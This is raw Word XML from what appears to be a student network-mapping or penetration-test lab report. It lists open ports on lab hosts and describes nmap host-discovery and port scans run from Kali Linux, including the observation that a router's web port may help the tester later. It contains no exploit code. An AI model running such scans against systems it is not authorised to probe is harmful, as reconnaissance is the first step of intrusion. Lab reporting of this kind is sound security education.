    <w:p w14:paraId="5962C004" w14:textId="664943B2" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEBFD8F" w14:textId="61D907B5" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3317326E" w14:textId="7E68ABA4" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9A486A" w14:textId="46DD8B0F" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2049 – NFS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C7009E" w14:textId="0DEF7E62" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PC5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164E1B62" w14:textId="77A0509A" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="462964C3" w14:textId="28349FD9" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0877F795" w14:textId="1C29C191" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0005BFFD" w14:textId="5B43FF62" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2049 – NFS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27315D07" w14:textId="42422C5F" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web Server 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766B8294" w14:textId="1E3BF64C" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280C31DC" w14:textId="708B237A" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A354619" w14:textId="6BB50529" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>443 – https</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164D3B97" w14:textId="66FD3AF7" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web Server 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149E7FA1" w14:textId="56E82B33" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E21F96" w14:textId="788F2D48" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70334DD1" w14:textId="547D177E" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335002DE" w14:textId="667B29D7" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454DFAE0" w14:textId="5799B650" w:rsidR="003E0AE4" w:rsidRPr="00521489" w:rsidRDefault="003E0AE4" w:rsidP="003E0AE4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Firewall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00519C5E" w14:textId="77777777" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00EF4289">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open ports:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E9E70C" w14:textId="02C5CA56" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>22 – SSH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62560CDD" w14:textId="4E377A55" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>80 – http</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A7D212" w14:textId="6C6FA7B8" w:rsidR="00EF4289" w:rsidRPr="00521489" w:rsidRDefault="00EF4289" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>111 – rpcbind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A24C483" w14:textId="77777777" w:rsidR="00EF4289" w:rsidRPr="00EF4289" w:rsidRDefault="00EF4289" w:rsidP="00EF4289"/>
    <w:p w14:paraId="32F4AD9A" w14:textId="77777777" w:rsidR="004B323B" w:rsidRPr="004B323B" w:rsidRDefault="004B323B" w:rsidP="004B323B"/>
    <w:p w14:paraId="3BE7D659" w14:textId="6EF6BD58" w:rsidR="009525A9" w:rsidRDefault="00FE7AC1" w:rsidP="008605B2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc183984551"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Network Mapping</w:t>
      </w:r>
      <w:r w:rsidR="005E001F">
        <w:t xml:space="preserve"> Process</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4816D8BE" w14:textId="1AA194E7" w:rsidR="009525A9" w:rsidRDefault="007D0D2A" w:rsidP="008605B2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc183984552"/>
      <w:r>
        <w:t xml:space="preserve">Initial Network </w:t>
      </w:r>
      <w:r w:rsidR="005E001F">
        <w:t>Scans</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="44E14F20" w14:textId="547682B4" w:rsidR="005E001F" w:rsidRPr="00521489" w:rsidRDefault="002D307F" w:rsidP="003C6E81">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Loading a Kali Linux OS onto the </w:t>
      </w:r>
      <w:r w:rsidR="004461D9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">network allows for an initial IP scan of the ports directly connected to the OS. </w:t>
      </w:r>
      <w:r w:rsidR="007D0D2A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 1 displays the results of the</w:t>
      </w:r>
      <w:r w:rsidR="004E17D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">se scans showing two </w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">IP hosts, the latter of which being the Kali Machine itself. </w:t>
      </w:r>
      <w:r w:rsidR="004E17D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A165C6" w14:textId="68A75E2C" w:rsidR="003C6E81" w:rsidRPr="00521489" w:rsidRDefault="0029488A" w:rsidP="00F13F90">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E302C6C" wp14:editId="2B409BD7">
            <wp:extent cx="4932045" cy="1399540"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="1786122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2045" cy="1399540"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="342A49E4" w14:textId="010100C5" w:rsidR="00F13F90" w:rsidRPr="00521489" w:rsidRDefault="00F13F90" w:rsidP="00F13F90">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 1. </w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ip </w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a scan</w:t>
      </w:r>
      <w:r w:rsidR="00B41EE6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the network initially.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1B1BEA" w14:textId="282B3522" w:rsidR="00B41EE6" w:rsidRPr="00521489" w:rsidRDefault="00F515BE" w:rsidP="0066240A">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A nmap</w:t>
      </w:r>
      <w:r w:rsidR="004E17D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> scan </w:t>
      </w:r>
      <w:r w:rsidR="000E0911" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="004E17D0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00616D18" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
      <w:r w:rsidR="00F756B0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">on kali’s IP address </w:t>
      </w:r>
      <w:r w:rsidR="00F756B0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to find any other connections</w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the machine</w:t>
      </w:r>
      <w:r w:rsidR="00DF63A1" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  Below is the result of this scan showing the connections.  </w:t>
      </w:r>
      <w:r w:rsidR="0066240A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">On top of this, another nmap scan </w:t>
      </w:r>
      <w:r w:rsidR="000E0911" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="0066240A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> run on the </w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>machine</w:t>
      </w:r>
      <w:r w:rsidR="0066240A" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to find all the open ports from the machines directly connected to it. </w:t>
      </w:r>
      <w:r w:rsidR="00B931F9" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The results of this scan can be found in Figure 3. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B9BC1C" w14:textId="5F6BE918" w:rsidR="00F13F90" w:rsidRPr="00521489" w:rsidRDefault="006F34A7" w:rsidP="006F34A7">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14F6A896" wp14:editId="5534A35C">
            <wp:extent cx="3927475" cy="1967230"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="233448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7475" cy="1967230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="531948D4" w14:textId="751930B7" w:rsidR="006F34A7" w:rsidRPr="00521489" w:rsidRDefault="006F34A7" w:rsidP="006F34A7">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 2. sudo nmap </w:t>
      </w:r>
      <w:r w:rsidR="00B41EE6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">-sn scan of the eth0 </w:t>
      </w:r>
      <w:r w:rsidR="00973556" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="00B41EE6" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BFA1D7" w14:textId="21DC7457" w:rsidR="00DD616C" w:rsidRPr="00521489" w:rsidRDefault="00DD616C" w:rsidP="006F34A7">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05F07932" wp14:editId="49E99A97">
            <wp:extent cx="3816985" cy="3837940"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1611219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985" cy="3837940"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B017F7B" w14:textId="2EC92AAB" w:rsidR="00DD616C" w:rsidRPr="00521489" w:rsidRDefault="00726D0A" w:rsidP="006F34A7">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure 3. </w:t>
      </w:r>
      <w:r w:rsidR="00DD616C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Nmap -oN scan of </w:t>
      </w:r>
      <w:r w:rsidR="00E91521" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the switch</w:t>
      </w:r>
      <w:r w:rsidR="00DD616C" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.0.192. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC8DE85" w14:textId="2F7A6632" w:rsidR="00B931F9" w:rsidRPr="00521489" w:rsidRDefault="00E91521" w:rsidP="00B931F9">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">From this nmap scan the first Router and PC </w:t>
      </w:r>
      <w:r w:rsidR="000E0911" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> located. The router appears to have a webpage attached to it as the http port appears open which could prove to be useful to the tester </w:t>
      </w:r>
      <w:r w:rsidR="000E0911" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>later</w:t>
      </w:r>
